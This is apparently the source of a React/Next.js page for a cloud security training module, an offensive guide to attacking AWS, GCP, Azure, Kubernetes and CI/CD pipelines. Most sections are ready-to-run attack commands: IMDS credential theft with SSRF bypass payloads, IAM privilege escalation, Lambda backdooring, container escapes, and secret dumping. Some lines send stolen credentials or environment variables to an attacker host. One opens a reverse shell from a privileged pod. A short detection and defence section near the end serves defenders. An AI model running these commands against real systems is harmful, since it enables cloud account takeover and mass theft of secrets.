'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#ff9500'
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a4a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080600', border: '1px solid #3a2800', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '3rem', marginBottom: '1rem' }}>
    <span style={{ color: '#3a2800', marginRight: '8px' }}>//</span>{children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 600, color: '#cc7800', marginTop: '2rem', marginBottom: '0.75rem' }}>
    &#9658; {children}
  </h3>
)
const P = ({ children }: { children: React.ReactNode }) => <p style={{ color: '#9a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,149,0,0.05)', border: '1px solid rgba(255,149,0,0.2)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem', marginTop: '0.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#ff9500', letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0, fontFamily: 'sans-serif' }}>{children}</p>
  </div>
)
const Warn = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(255,65,54,0.05)', borderLeft: '3px solid #ff4136', padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: '1px solid rgba(255,65,54,0.2)', borderLeftColor: '#ff4136' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#ff4136', letterSpacing: '0.2em', marginBottom: '6px' }}>WARNING</div>
    <div style={{ color: '#9a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
  </div>
)
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
      <thead><tr style={{ borderBottom: '1px solid #3a2800' }}>{headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: accent, fontWeight: 600, fontSize: '0.7rem' }}>{h}</th>)}</tr></thead>
      <tbody>{rows.map((row, i) => <tr key={i} style={{ borderBottom: '1px solid #1a1400', background: i % 2 === 0 ? 'transparent' : 'rgba(255,149,0,0.02)' }}>{row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#9a9a8a', verticalAlign: 'top' }}>{cell}</td>)}</tr>)}</tbody>
    </table>
  </div>
)

export default function CloudSecurity() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a6a4a' }}>
        <Link href="/" style={{ color: '#5a6a4a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span><span style={{ color: accent }}>MOD-09 // CLOUD SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(255,149,0,0.08)', border: '1px solid rgba(255,149,0,0.3)', borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/cloud-security/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(255,149,0,0.1)', border: '1px solid rgba(255,149,0,0.5)', borderRadius: '3px', color: '#ff9500', fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a4a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 09 &middot; CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: 'rgba(255,149,0,0.35) 0 0 20px' }}>CLOUD SECURITY</h1>
        <p style={{ color: '#5a6a4a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>AWS IAM exploitation &middot; S3 misconfigs &middot; IMDS attacks &middot; Serverless vulns &middot; GCP/Azure &middot; Container escapes &middot; CI/CD attacks</p>
      </div>

      {/* TOC */}
      <div style={{ background: '#0a0800', border: '1px solid #3a2800', borderRadius: '6px', padding: '1.25rem', marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a6a4a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>TABLE OF CONTENTS</div>
        {[
          '01 — AWS Fundamentals for Attackers',
          '02 — AWS CLI Setup & Enumeration',
          '03 — IMDS — Stealing Credentials from EC2',
          '04 — S3 Bucket Attacks',
          '05 — IAM Privilege Escalation',
          '06 — Lambda & Serverless Attacks',
          '07 — Container Escape (Docker & Kubernetes)',
          '08 — CI/CD Pipeline Attacks',
          '09 — GCP Attack Patterns',
          '10 — Azure Attack Patterns',
          '11 — Cloud Detection & Defence',
          '12 — Tools & Framework',
        ].map((item, i) => (
          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a6a4a', padding: '3px 0', display: 'flex', gap: '8px' }}>
            <span style={{ color: '#3a2800' }}>&#9002;</span>
            <span>{item}</span>
          </div>
        ))}
      </div>

      <H2>01 — AWS Fundamentals for Attackers</H2>
      <P>Cloud environments like AWS differ from traditional networks in a critical way: access is controlled through IAM (Identity and Access Management) rather than firewalls. One misconfigured IAM role, one public S3 bucket, or one exposed API key can give an attacker access to an entire cloud environment — often without setting off traditional alarms.</P>
      <Note>AWS, Azure, and GCP are not just &apos;servers in the internet&apos; — they are entire data center ecosystems with hundreds of services. When a company says they are &apos;in the cloud&apos;, they mean they have replaced physical servers with services like EC2 (virtual machines), S3 (file storage), and RDS (databases) managed by Amazon, Microsoft, or Google.</Note>

      <Table
        headers={['AWS SERVICE', 'ATTACKER INTEREST', 'COMMON VULNERABILITY']}
        rows={[
          ['IAM', 'Access control for everything', 'Overpermissioned roles, inline policies, long-lived access keys'],
          ['S3', 'File storage, backups, assets', 'Public buckets, ACL misconfigs, unauthenticated read/write'],
          ['EC2', 'Virtual machines', 'IMDS credential theft via SSRF, user data secrets, open SGs'],
          ['Lambda', 'Serverless functions', 'Environment variables with secrets, event injection, role abuse'],
          ['EKS/ECS', 'Container orchestration', 'IMDS access from container, service account token theft'],
          ['RDS', 'Databases', 'Public snapshots, weak passwords, snapshot sharing misconfig'],
          ['Secrets Manager', 'Credentials vault', 'IAM permissions allow read → mass credential harvest'],
          ['CloudTrail', 'Audit logging', 'Disable/pause logging to cover tracks'],
          ['CodeBuild/CodePipeline', 'CI/CD', 'Inject malicious code into build pipelines'],
          ['SSM Parameter Store', 'Config/secrets', 'Read permissions often too broad'],
        ]}
      />

      <H2>02 — AWS CLI Setup & Enumeration</H2>
      <Pre label="// SETUP AND BASIC ENUMERATION">{`# Install AWS CLI:
pip install awscli
# Or: curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"

# Configure credentials:
aws configure
# AWS Access Key ID: AKIA...  (or ASIA... for temporary)
# AWS Secret Access Key: ...
# Default region: us-east-1
# Default output format: json

# Check who you are (critical first step):
aws sts get-caller-identity
# Returns: Account ID, User ID, ARN (tells you what you are)

# Key ID prefixes:
# AKIA... = long-term IAM user access key
# ASIA... = temporary STS credentials (shorter window)
# AROA... = role ID

# Enumerate IAM:
aws iam list-users
aws iam list-roles
aws iam list-groups
aws iam get-user  # current user info
aws iam list-attached-user-policies --user-name TARGET_USER
aws iam list-user-policies --user-name TARGET_USER
aws iam get-user-policy --user-name USER --policy-name POLICY

# Enumerate resources:
aws s3 ls                                  # all S3 buckets
aws ec2 describe-instances --output table  # EC2 instances
aws lambda list-functions                  # Lambda functions
aws secretsmanager list-secrets            # Secrets Manager
aws ssm describe-parameters                # Parameter Store
aws iam list-roles | grep -i "admin\|power\|full"  # high-priv roles

# Check CloudTrail logging status:
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name TRAIL_NAME`}</Pre>

      <H3>Automated Enumeration Tools</H3>
      <Pre label="// ENUM ALL THE THINGS">{`# Enumerate permissions (what can this key actually do?):
pip install enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key ... --region us-east-1
# Tries common API calls → shows what permissions you have
# Takes 5-10 minutes — runs through hundreds of API calls

# ScoutSuite — multi-cloud security auditing:
pip install scoutsuite
scout aws --access-key-id AKIA... --secret-access-key ...
# Generates HTML report: security misconfigurations across all services

# Prowler — compliance + security checks:
pip install prowler
prowler aws -c --access-key AKIA... --secret-key ...
# Checks: CIS benchmarks, GDPR, HIPAA, SOC2 controls

# Pacu — AWS exploitation framework:
git clone https://github.com/RhinoSecurityLabs/pacu
pip install -r requirements.txt
python3 pacu.py
# In Pacu:
import_keys --all  # import from ~/.aws/credentials
run iam__enum_permissions
run iam__privesc_scan
run s3__enum`}</Pre>

      <H2>03 — IMDS — Stealing Credentials from EC2</H2>
      <P>Every EC2 instance can query a special IP address — 169.254.169.254 — to get information about itself, including the temporary AWS credentials for whatever role it is running as. This is the Instance Metadata Service (IMDS). The attack: if a web application running on EC2 is vulnerable to SSRF (Server-Side Request Forgery), an attacker can make the server fetch its own metadata and leak its cloud credentials.</P>
      <Note>SSRF (Server-Side Request Forgery) means tricking a server into making HTTP requests on your behalf. Imagine a web app that lets you preview URLs — if you pass it a URL pointing to the internal metadata service, the server will fetch that URL from inside AWS and return the credentials to you.</Note>

      <Pre label="// IMDS EXPLOITATION VIA SSRF">{`# IMDSv1 (legacy, no auth required):
curl http://169.254.169.254/latest/meta-data/

# Get IAM role name:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2025-01-01T00:00:00Z"
# }

# Use stolen credentials:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity  # confirm you have valid session

# SSRF exploitation patterns:
# Classic: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IPv6 bypass: url=http://[::ffff:169.254.169.254]/latest/meta-data/
# Decimal IP: url=http://2852039166/latest/meta-data/
# URL encoding: url=http://169.254.169.254%2Flatest%2Fmeta-data
# Redirect chain: attacker server 301-redirects to 169.254.169.254

# IMDSv2 (requires PUT request for token first):
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Via SSRF with IMDSv2:
# Need app that follows redirects AND supports PUT method
# Some SSRF vulnerabilities allow arbitrary headers → send PUT + header

# Other juicy IMDS endpoints:
curl http://169.254.169.254/latest/user-data  # startup scripts (may have creds)
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/public-keys/`}</Pre>

      <H2>04 — S3 Bucket Attacks</H2>
      <P>S3 buckets are like folders on the internet — companies use them to store files, backups, logs, and assets. The problem: bucket access controls are complex and frequently misconfigured. A public bucket might contain database backups, private keys, or customer data that was never meant to be exposed.</P>

      <Pre label="// FINDING AND EXPLOITING S3 MISCONFIGURATIONS">{`# Step 1: Find buckets (common naming patterns)
# company-backup, company-logs, company-dev, company-prod
# company-assets, company-data, company-uploads, company-builds

# Check public access unauthenticated:
curl https://BUCKET-NAME.s3.amazonaws.com/
# 200 OK = bucket exists and is public
# 403 Forbidden = bucket exists but private (or requester-pays)
# 404 Not Found = bucket does not exist

# List contents (if public):
curl "https://BUCKET-NAME.s3.amazonaws.com/?list-type=2"

# Download all files (unauthenticated if public):
aws s3 sync s3://BUCKET-NAME ./ --no-sign-request

# Check for write access (dangerous if true):
echo test > test.txt
aws s3 cp test.txt s3://BUCKET-NAME/test.txt --no-sign-request
# Success = public write = anyone can upload malicious content

# Tools for finding buckets:
# 1. S3Scanner
pip install s3scanner
s3scanner --bucket-file wordlist.txt  # common bucket names + company prefixes

# 2. Subfinder + S3 bucket naming convention
# Find subdomains → derive bucket names from patterns

# 3. GrayhatWarfare: buckets.grayhatwarfare.com
# Search for public S3 buckets by keyword

# Check bucket policy and ACL:
aws s3api get-bucket-policy --bucket BUCKET-NAME
aws s3api get-bucket-acl --bucket BUCKET-NAME
aws s3api get-public-access-block --bucket BUCKET-NAME

# High-value files to search for:
# .env, .env.production, .env.local, .env.backup
# config.json, secrets.json, credentials.csv, credentials.json
# backup.sql, database.sql, dump.sql, *.sql.gz
# private_key.pem, id_rsa, server.key
# wp-config.php, database.php, settings.py
# *.pfx, *.p12 (certificates with private keys)
# terraform.tfstate (contains all infrastructure + often secrets!)`}</Pre>

      <H3>Terraform State File Attack</H3>
      <Pre label="// TERRAFORM STATE — JACKPOT">{`# terraform.tfstate is stored in S3 by many teams
# It contains ALL infrastructure definitions including:
# - Passwords passed to resources at creation time
# - Database connection strings
# - API keys used by infrastructure
# - Network topology

# Find it:
aws s3 ls s3://BUCKET-NAME --recursive | grep terraform.tfstate

# Download and parse:
aws s3 cp s3://BUCKET-NAME/path/terraform.tfstate .
cat terraform.tfstate | python3 -m json.tool | grep -i "password\|secret\|key"

# Typical finds:
# RDS database passwords (set at creation)
# Elasticache auth tokens
# API gateway keys
# CloudFront signing keys`}</Pre>

      <H2>05 — IAM Privilege Escalation</H2>
      <Note>IAM privilege escalation means using limited permissions you already have to grant yourself more permissions. Think of it like a new employee who can only read files, but discovers they have permission to edit the access control list — so they give themselves admin rights. AWS has dozens of escalation paths; security tools like Pacu automate finding them.</Note>

      <Pre label="// 15 PRIVILEGE ESCALATION PATHS IN AWS IAM">{`# Path 1: iam:CreatePolicyVersion
# Replace existing policy with admin policy:
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY_NAME \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:AttachUserPolicy
aws iam attach-user-policy \
  --user-name YOUR_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Path 3: iam:AddUserToGroup (if admin group exists)
aws iam add-user-to-group --user-name YOUR_USER --group-name Admins

# Path 4: iam:PassRole + ec2:RunInstances
# Create EC2 with admin role → steal creds from IMDS
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name=ADMIN_ROLE \
  --user-data '#!/bin/bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE \
  | curl -X POST http://ATTACKER_IP:8888 -d @-'

# Path 5: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
aws lambda create-function \
  --function-name escalate \
  --runtime python3.12 \
  --role arn:aws:iam::ACCOUNT:role/ADMIN_ROLE \
  --handler index.handler \
  --zip-file fileb://payload.zip

aws lambda invoke --function-name escalate output.txt

# Path 6: iam:CreateAccessKey (on another user)
aws iam create-access-key --user-name admin_user
# Creates key for that user → you have admin access

# Path 7: iam:UpdateAssumeRolePolicy
# Modify role trust policy to allow your user to assume it:
aws iam update-assume-role-policy \
  --role-name ADMIN_ROLE \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/YOUR_USER"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ADMIN_ROLE --role-session-name privesc

# Automated scanning:
# Pacu:
run iam__privesc_scan
# bf-escalate (BishopFox):
pip install aws-escalate
aws-escalate --access-key AKIA... --secret-key ...`}</Pre>

      <H2>06 — Lambda & Serverless Attacks</H2>
      <P>Lambda functions run code without servers. They often have overpermissioned IAM roles (because developers find least-privilege difficult), store secrets in environment variables, and are triggered by events from other AWS services — creating event injection opportunities.</P>

      <Pre label="// LAMBDA FUNCTION EXPLOITATION">{`# Enumerate Lambda functions:
aws lambda list-functions
aws lambda get-function --function-name FUNCTION_NAME
aws lambda get-function-configuration --function-name FUNCTION_NAME
# Reveals: runtime, handler, role ARN, VPC config, environment variables (!)

# Read environment variables (if you have lambda:GetFunction):
aws lambda get-function --function-name FUNCTION_NAME \
  --query 'Configuration.Environment.Variables'
# Often contains: DB_PASSWORD, API_KEY, STRIPE_SECRET, etc.

# Invoke a Lambda function (with arbitrary input):
aws lambda invoke --function-name FUNCTION_NAME \
  --payload '{"action":"test","data":"malicious_input"}' \
  output.json

# Event injection:
# If Lambda reads from SQS/SNS/S3 events and processes data
# Inject malicious payload into the event source
# Lambda processes it → Server-Side Template Injection, SQL injection, etc.

# Lambda layer attack (if you can create/update layers):
aws lambda list-layer-versions --layer-name LAYER_NAME
# Add malicious code to a shared layer
# All functions using that layer execute your code

# Update function code (if lambda:UpdateFunctionCode):
# Backdoor the function:
# 1. Download current deployment package
aws lambda get-function --function-name FUNC --query 'Code.Location' --output text
# 2. Add backdoor to downloaded zip
# 3. Upload modified version
aws lambda update-function-code --function-name FUNC --zip-file fileb://modified.zip`}</Pre>

      <H2>07 — Container Escape (Docker & Kubernetes)</H2>
      <P>Containers (Docker, Kubernetes) are meant to isolate applications from the host system. But misconfigurations — like mounting the Docker socket, running with --privileged, or having excessive capabilities — can allow an attacker who compromises a container to break out and access the underlying host.</P>
      <Note>A container is like a sandbox: your code runs inside it, isolated from everything else. A container escape is when you find a hole in the sandbox walls and climb out to the host system. Once on the host, you have access to every other container and potentially the entire cloud account.</Note>

      <Pre label="// CONTAINER ESCAPE TECHNIQUES">{`# First: detect if you are in a container:
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv              # file exists in Docker containers
cat /proc/self/mountinfo | grep overlay  # overlay filesystem = container

# Check what capabilities you have:
capsh --print 2>/dev/null || cat /proc/1/status | grep Cap
# cap_sys_admin = nearly full host access
# cap_net_admin = network configuration
# cap_sys_ptrace = can ptrace host processes

# ESCAPE 1: Mounted Docker socket (most common)
ls /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host ubuntu /bin/sh
chroot /host  # now you are root on the host OS

# ESCAPE 2: Privileged container
# --privileged gives ALL capabilities + all devices
mkdir /mnt/host
mount /dev/sda1 /mnt/host  # mount host filesystem
chroot /mnt/host /bin/bash

# ESCAPE 3: writable /proc/sysrq-trigger
# echo 'f' > /proc/sysrq-trigger   # crashes host (not useful but shows access)

# ESCAPE 4: runc CVE-2019-5736 (historical, patched)
# Overwrite host runc binary if running old Docker version

# Kubernetes: steal service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Query K8s API with token:
curl -sSk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/pods
curl -sSk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
curl -sSk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Create privileged pod to escape to host:
curl -sSk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"escape"},"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"c","image":"ubuntu","command":["/bin/sh","-c","nsenter -t 1 -m -u -i -n -p -- bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],"securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"hostfs"}]}],"volumes":[{"name":"hostfs","hostPath":{"path":"/"}}]}}'`}</Pre>

      <H3>EKS Cluster Privilege Escalation</H3>
      <Pre label="// AWS EKS SPECIFIC ATTACKS">{`# EKS clusters use aws-auth ConfigMap to map IAM to K8s roles
# Misconfigured: maps too many IAM entities to cluster-admin

# From compromised node: get node IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Use these to call K8s API directly if role has eks:DescribeCluster

# Update kubeconfig with stolen credentials:
aws eks update-kubeconfig --name CLUSTER_NAME --region us-east-1
# Uses current AWS credentials to get K8s token

# Check your K8s permissions:
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets

# If cluster-admin: extract all secrets:
kubectl get secrets --all-namespaces -o json | python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data['items']:
    for k,v in item.get('data',{}).items():
        print(item['metadata']['name'], k, base64.b64decode(v).decode('utf-8','ignore'))
"`}</Pre>

      <H2>08 — CI/CD Pipeline Attacks</H2>
      <P>CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins, CircleCI) are prime targets: they have access to secrets, deploy credentials, and production infrastructure. A code commit triggers automated builds that often run with high privileges.</P>

      <Pre label="// ATTACK CI/CD PIPELINES">{`# Attack 1: Inject malicious code into shared workflow
# (if you have write access to repository)
# Modify .github/workflows/*.yml to exfiltrate secrets:
#
# - name: Exfil secrets
#   run: curl -X POST attacker.com/collect -d "$(env)"
#
# Secrets available as env vars in GitHub Actions

# Attack 2: Pull Request injection
# Open PR that modifies workflow files
# Some pipelines run PR code with repo secrets accessible
# (depends on configuration — pull_request_target is dangerous)

# Attack 3: Dependency confusion
# Public package manager name squatting
# Upload malicious package to npm/pypi with same name as internal package
# CI pipeline installs from public repo → executes malicious postinstall script

# Attack 4: Compromise dependencies
# Supply chain attack on a popular library
# When pipeline runs npm install → malicious code executes in build env
# Can exfiltrate: AWS_ACCESS_KEY_ID, GITHUB_TOKEN, etc.

# Attack 5: Expose secrets via PR (repo fork attack)
# Fork repo → open PR with: echo $AWS_SECRET_ACCESS_KEY
# Some pipelines run forked PRs with secrets accessible

# Attack 6: OIDC token theft (GitHub Actions → AWS)
# GitHub Actions can get short-lived AWS tokens via OIDC
# If github.com account is compromised → access AWS directly
# aws sts assume-role-with-web-identity ...

# Detect CI/CD environments:
env | grep -i "ci\|jenkins\|github_actions\|gitlab_ci\|circle\|travis"
cat /etc/environment | grep -i secret
# Most CI envs inject: CI=true, $GITHUB_TOKEN, $AWS_ACCESS_KEY_ID, etc.`}</Pre>

      <H2>09 — GCP Attack Patterns</H2>
      <Pre label="// GCP EXPLOITATION">{`# GCP metadata endpoint (requires Metadata-Flavor header):
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns: access_token, expires_in, token_type

# Other useful metadata:
curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" -H "Metadata-Flavor: Google" --recursive
# attributes/ may contain startup-script with hardcoded credentials!

# Via SSRF:
# url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header injection: Metadata-Flavor: Google (must be included)
# Some SSRF tools auto-add this header

# Set stolen token:
gcloud config set auth/access_token ACCESS_TOKEN_VALUE

# Enumerate:
gcloud projects list
gcloud iam service-accounts list --project PROJECT_ID
gcloud storage buckets list
gcloud functions list --project PROJECT_ID
gcloud sql instances list --project PROJECT_ID
gcloud secrets list --project PROJECT_ID

# GCP Storage bucket public check:
curl -s "https://storage.googleapis.com/BUCKET_NAME" | head -20
gsutil ls gs://BUCKET_NAME  # authenticated
curl "https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o"  # list objects

# IAM enumeration:
gcloud projects get-iam-policy PROJECT_ID
gcloud iam roles list --project PROJECT_ID
# Find service accounts with editor/owner roles

# Privilege escalation paths:
# iam.serviceAccounts.actAs → assume any service account
# iam.serviceAccounts.signBlob → create arbitrary tokens
# compute.instances.create with SA → IMDS credential theft`}</Pre>

      <H2>10 — Azure Attack Patterns</H2>
      <Pre label="// AZURE EXPLOITATION">{`# Azure IMDS endpoint:
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get OAuth token from managed identity:
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns: access_token, token_type, expires_in

# Use token:
export ARM_ACCESS_TOKEN=TOKEN_VALUE
az login --service-principal --tenant TENANT_ID  # not needed with token

# Enumerate with az CLI + token:
az account list
az vm list
az storage account list
az keyvault list
az webapp list
az functionapp list
az ad sp list  # service principals
az role assignment list --all  # all role assignments

# Azure Storage attacks:
# Public Blob containers:
curl "https://STORAGE.blob.core.windows.net/CONTAINER/?restype=container&comp=list"
# 200 = public, 409 = private

# Storage SAS token abuse:
# SAS URLs: https://storage.blob.core.windows.net/container/file?sv=...&sig=...
# Expired SAS token? → enumerate: sv (service version), se (expiry), sp (permissions)

# Key Vault:
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
az keyvault key list --vault-name VAULT_NAME

# Azure AD (Entra ID) attacks:
# OAuth token for graph.microsoft.com:
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
# List users:
curl -H "Authorization: Bearer TOKEN" "https://graph.microsoft.com/v1.0/users"
# List groups:
curl -H "Authorization: Bearer TOKEN" "https://graph.microsoft.com/v1.0/groups"`}</Pre>

      <H2>11 — Cloud Detection & Defence</H2>
      <H3>AWS Detection Opportunities</H3>
      <Table
        headers={['ATTACK', 'AWS DETECTION SOURCE', 'KEY INDICATOR']}
        rows={[
          ['API key use', 'CloudTrail', 'Unusual API calls, new region, new service access'],
          ['IMDS credential theft', 'GuardDuty', 'Credential used from external IP (not EC2)'],
          ['S3 data access', 'S3 Access Logs + CloudTrail', 'High volume GetObject, unusual source IP'],
          ['IAM privilege escalation', 'CloudTrail', 'iam:AttachUserPolicy, iam:CreatePolicyVersion events'],
          ['Container escape', 'CloudTrail + GuardDuty', 'API calls from EKS node role outside normal pattern'],
          ['Recon/enumeration', 'CloudTrail', 'Flood of Describe* API calls across services'],
        ]}
      />

      <Pre label="// DEFENSIVE BASELINE">{`# Minimum viable cloud security:

# 1. Enable CloudTrail in ALL regions:
aws cloudtrail create-trail --name all-regions --s3-bucket-name BUCKET \
  --is-multi-region-trail --enable-log-file-validation

# 2. Enable GuardDuty:
aws guardduty create-detector --enable

# 3. IAM access analyser:
aws accessanalyzer create-analyzer --analyzer-name account-analyzer --type ACCOUNT

# 4. S3 Block Public Access (account-level):
aws s3control put-public-access-block --account-id ACCOUNT_ID \
  --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# 5. Enforce IMDSv2 on all EC2:
aws ec2 modify-instance-metadata-options \
  --instance-id INSTANCE_ID \
  --http-tokens required \
  --http-put-response-hop-limit 1

# 6. Least privilege — regularly review:
aws iam generate-credential-report
aws iam get-credential-report  # shows unused keys, no MFA, last used`}</Pre>

      <H2>12 — Tools & Framework</H2>
      <Table
        headers={['TOOL', 'PURPOSE', 'CLOUD']}
        rows={[
          ['Pacu', 'AWS exploitation framework, module-based attack automation', 'AWS'],
          ['ScoutSuite', 'Multi-cloud security auditing, HTML report', 'AWS/GCP/Azure'],
          ['Prowler', 'CIS benchmark checks, compliance scanning', 'AWS/GCP/Azure'],
          ['Enumerate-IAM', 'Brute-force IAM permissions for a key', 'AWS'],
          ['S3Scanner', 'Find and probe public S3 buckets', 'AWS'],
          ['CloudSploit', 'Misconfig scanning, open source', 'AWS/GCP/Azure'],
          ['MicroBurst', 'Azure enumeration and exploitation', 'Azure'],
          ['GCPBucketBrute', 'Find public GCP storage buckets', 'GCP'],
          ['ROADtools', 'Azure AD/Entra ID enumeration', 'Azure'],
          ['kube-hunter', 'Kubernetes security issues scanner', 'K8s'],
        ]}
      />

      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2e1e' }}>
        <div style={{ background: 'rgba(255,149,0,0.04)', border: '1px solid rgba(255,149,0,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a3a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: '#ff9500', marginBottom: '0.5rem', fontWeight: 600 }}>MOD-09 Interactive Lab</div>
